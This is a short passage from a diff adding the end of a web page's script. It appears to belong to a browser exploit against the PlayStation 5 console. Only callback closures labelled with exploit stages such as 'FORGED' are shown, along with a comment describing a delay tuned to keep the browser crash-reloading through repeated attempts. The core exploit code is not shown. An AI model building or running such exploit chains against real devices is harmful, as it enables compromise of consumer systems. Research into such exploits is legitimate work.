+      },60); /* post ADD-OK */
+    },40); /* post FAMILY-OK */
+  },60); /* post FORGED */
+}
+
+/* 2s pre-trigger delay: slow the crash rate so the PS5 browser's
+   crash-recovery counter doesn't expire at ~17 attempts.
+   v25d needed try=35 — we need the browser to keep reloading longer. */
+if(document.readyState==='complete'||document.readyState==='interactive')
+  setTimeout(start,2000);
+else document.addEventListener('DOMContentLoaded',function(){setTimeout(start,2000);});
+</script></body></html>
